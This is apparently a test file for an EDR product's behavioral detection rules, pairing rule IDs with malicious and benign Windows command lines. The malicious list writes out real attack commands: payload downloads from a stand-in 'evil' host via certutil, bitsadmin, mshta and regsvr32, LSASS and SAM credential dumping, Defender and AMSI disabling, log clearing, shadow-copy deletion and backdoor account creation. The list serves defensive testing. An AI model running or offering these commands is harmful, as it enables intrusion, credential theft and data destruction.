#!/usr/bin/env python3
"""Behavioral IOA rule engine tests (valkyrie/behavioral_rules.py).

Every shipped rule must (1) fire on a representative malicious command shape,
(2) map to a real ATT&CK technique the kill-chain correlator understands, and
(3) NOT fire on a benign control. Broad coverage is the point — this is the
endpoint-detection breadth that separates a real EDR from a few heuristics.

  [1] Every rule fires on its own malicious example
  [2] Every rule's technique maps to an ATT&CK tactic (chain-ready)
  [3] Benign controls do not fire (false-positive boundary)
  [4] classify_behavior surfaces the highest-severity hit + all labels
  [5] Pipeline: a rule hit becomes a detection with the right technique
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

_FAILURES: list[str] = []


def _check(label: str, ok: bool) -> None:
    print(f"  [{'+' if ok else '!'}] {label}: {'PASS' if ok else 'FAIL'}")
    if not ok:
        _FAILURES.append(label)


# (rule_id, image, parent, cmdline, path) — a representative TRUE positive each.
MALICIOUS = [
    ("office-spawns-shell", "powershell.exe", "winword.exe", "powershell -nop", ""),
    ("wmic-process-call", "wmic.exe", "cmd.exe", "wmic process call create calc.exe", ""),
    ("mshta-remote", "mshta.exe", "explorer.exe", "mshta https://evil/x.hta", ""),
    ("regsvr32-scriptlet", "regsvr32.exe", "cmd.exe", "regsvr32 /s /n /u /i:https://evil/x.sct scrobj.dll", ""),
    ("rundll32-proxy", "rundll32.exe", "cmd.exe", "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\"", ""),
    ("suspicious-path-exec", "x.exe", "explorer.exe", "x.exe", r"C:\Users\v\AppData\Local\Temp\x.exe"),
    ("certutil-download", "certutil.exe", "cmd.exe", "certutil -urlcache -f http://evil/a.exe a.exe", ""),
    ("certutil-decode", "certutil.exe", "cmd.exe", "certutil -decode a.b64 a.exe", ""),
    ("bitsadmin-transfer", "bitsadmin.exe", "cmd.exe", "bitsadmin /transfer j http://evil/a.exe c:\\a.exe", ""),
    ("netsh-firewall-off", "netsh.exe", "cmd.exe", "netsh advfirewall set allprofiles state off", ""),
    ("defender-disable", "powershell.exe", "cmd.exe", "Set-MpPreference -DisableRealtimeMonitoring $true", ""),
    ("amsi-bypass", "powershell.exe", "cmd.exe", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", ""),
    ("clear-eventlog", "wevtutil.exe", "cmd.exe", "wevtutil cl Security", ""),
    ("usn-journal-delete", "fsutil.exe", "cmd.exe", "fsutil usn deletejournal /d c:", ""),
    ("execpolicy-bypass", "powershell.exe", "cmd.exe", "powershell -ExecutionPolicy Bypass -File x.ps1", ""),
    ("comsvcs-minidump", "rundll32.exe", "cmd.exe", "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 640 c:\\lsass.dmp full", ""),
    ("procdump-lsass", "procdump.exe", "cmd.exe", "procdump -ma lsass.exe lsass.dmp", ""),
    ("reg-save-hive", "reg.exe", "cmd.exe", "reg save hklm\\sam c:\\sam.hive", ""),
    ("ntdsutil-ifm", "ntdsutil.exe", "cmd.exe", "ntdsutil ac i ntds ifm create full c:\\out q q", ""),
    ("vaultcmd-creds", "vaultcmd.exe", "cmd.exe", "vaultcmd /listcreds:\"Windows Credentials\"", ""),
    ("reg-add-runkey", "reg.exe", "cmd.exe", "reg add hkcu\\software\\microsoft\\windows\\currentversion\\run /v x /d evil.exe", ""),
    ("schtasks-create", "schtasks.exe", "cmd.exe", "schtasks /create /tn x /tr evil.exe /sc onlogon", ""),
    ("sc-create-service", "sc.exe", "cmd.exe", "sc create evil binpath= c:\\evil.exe", ""),
    ("net-user-add", "net.exe", "cmd.exe", "net user backdoor P@ss /add", ""),
    ("net-localgroup-admin-add", "net.exe", "cmd.exe",
     "net localgroup administrators evilcorp /add", ""),
    ("wmi-event-consumer", "powershell.exe", "cmd.exe", "Set-WmiInstance -Class CommandLineEventConsumer", ""),
    ("vssadmin-delete", "vssadmin.exe", "cmd.exe", "vssadmin delete shadows /all /quiet", ""),
    ("wbadmin-delete", "wbadmin.exe", "cmd.exe", "wbadmin delete catalog -quiet", ""),
    ("bcdedit-recovery-off", "bcdedit.exe", "cmd.exe", "bcdedit /set {default} recoveryenabled no", ""),
    ("nltest-domain", "nltest.exe", "cmd.exe", "nltest /dclist:corp", ""),
    ("whoami-priv", "whoami.exe", "cmd.exe", "whoami /priv", ""),
    ("psexec-remote", "psexec.exe", "cmd.exe", "psexec \\\\host -s cmd.exe", ""),
    ("wmic-remote-node", "wmic.exe", "cmd.exe", "wmic /node:10.0.0.5 process call create calc", ""),
]

# Benign command shapes that must NEVER fire any rule.
BENIGN = [
    ("chrome.exe", "explorer.exe", "chrome.exe --profile-directory=Default", r"C:\Program Files\Google\Chrome\chrome.exe"),
    ("powershell.exe", "explorer.exe", "powershell Get-ChildItem C:\\Users", ""),
    ("cmd.exe", "explorer.exe", "cmd /c dir", ""),
    ("reg.exe", "cmd.exe", "reg query hklm\\software\\microsoft\\windows", ""),   # query, not add/save
    ("net.exe", "cmd.exe", "net view", ""),                                       # not user/add
    # Regression control for the redteam-evaluation finding (2026-07-30):
    # net-user-add used to match on the bare substring "net user" with no
    # mutating verb required, so listing accounts fired the identical
    # T1136.001 "account created" incident as actually creating one.
    ("net.exe", "cmd.exe", "net user", ""),                                       # list accounts, not /add
    ("net.exe", "cmd.exe", "net user backdoor", ""),                              # query one account, not /add
    ("net.exe", "cmd.exe", "net localgroup administrators", ""),                  # list membership, not /add
    ("certutil.exe", "cmd.exe", "certutil -hashfile a.exe sha256", ""),           # hash, not download/decode
    ("sc.exe", "cmd.exe", "sc query windefend", ""),                              # query, not create
    ("schtasks.exe", "cmd.exe", "schtasks /query", ""),                           # query, not create
    ("wmic.exe", "cmd.exe", "wmic os get caption", ""),                           # info, not process-call/node
    ("winword.exe", "explorer.exe", "winword.exe report.docx", r"C:\Program Files\Microsoft Office\winword.exe"),
    ("msbuild.exe", "devenv.exe", "msbuild project.sln", r"C:\Program Files\dotnet\msbuild.exe"),
]


def main() -> int:
    from valkyrie.behavioral_rules import RULES, match_process, classify_behavior
    from valkyrie.edr.killchain import tactic_for

    print("\n=== behavioral IOA rules ===\n")

    by_id = {r.id: r for r in RULES}
    mal_ids = {m[0] for m in MALICIOUS}

    print(f"[1] Every rule ({len(RULES)}) fires on its malicious example")
    _check("a malicious example exists for every shipped rule",
           set(by_id) == mal_ids)
    for rid, image, parent, cmd, path in MALICIOUS:
        hits = {h.rule_id for h in match_process(image, parent, cmd, path)}
        _check(f"{rid} fires", rid in hits)

    print("\n[2] Every rule's technique maps to a chain-ready tactic")
    for r in RULES:
        _check(f"{r.id} → {r.technique.split(' ')[0]} has a tactic",
               tactic_for(r.technique) is not None)

    print("\n[3] Benign controls do not fire")
    for image, parent, cmd, path in BENIGN:
        hits = match_process(image, parent, cmd, path)
        _check(f"benign '{cmd[:40]}' → no hit",
               len(hits) == 0 or all(False for _ in hits))

    print("\n[4] classify_behavior surfaces top severity + labels")
    b = classify_behavior("vssadmin.exe", "cmd.exe", "vssadmin delete shadows /all", "")
    _check("shadow delete is critical", b and b["severity"] == "critical")
    _check("technique is T1490", b and "T1490" in b["technique"])
    none = classify_behavior("chrome.exe", "explorer.exe", "chrome.exe", "")
    _check("benign returns None", none is None)

    print("\n[5] Pipeline — a rule hit becomes a detection with its technique")
    import tempfile, time
    from valkyrie.store import Store
    from valkyrie.edr import EdrEngine
    with tempfile.TemporaryDirectory() as td:
        store = Store(db_path=Path(td) / "b.db"); store.start()
        engine = EdrEngine(store); engine.start()
        beh = classify_behavior("rundll32.exe", "cmd.exe",
                                "rundll32 comsvcs.dll MiniDump 640 c:\\l.dmp full", "")
        inc_id = engine.ingest_telemetry({
            "category": "process", "activity": "exec", "action": "flagged",
            "severity": beh["severity"], "labels": beh["labels"],
            "reason": beh["reason"], "actor_name": "rundll32.exe", "actor_pid": 6,
            "fields": {"technique": beh["technique"], "ppid": 4}})
        _check("critical LSASS-dump rule raised an incident", inc_id is not None)
        if inc_id:
            det = (engine.get_incident(inc_id).get("detections") or [{}])[0]
            _check("detection carries the exact technique (T1003.001)",
                   "T1003.001" in (det.get("technique") or ""))
        engine.stop(); store.stop()

    print("\n" + "=" * 52)
    if _FAILURES:
        print(f"FAILED: {len(_FAILURES)} check(s)")
        for f in _FAILURES:
            print(f"  - {f}")
        return 1
    print(f"All checks PASSED ({len(RULES)} rules).")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
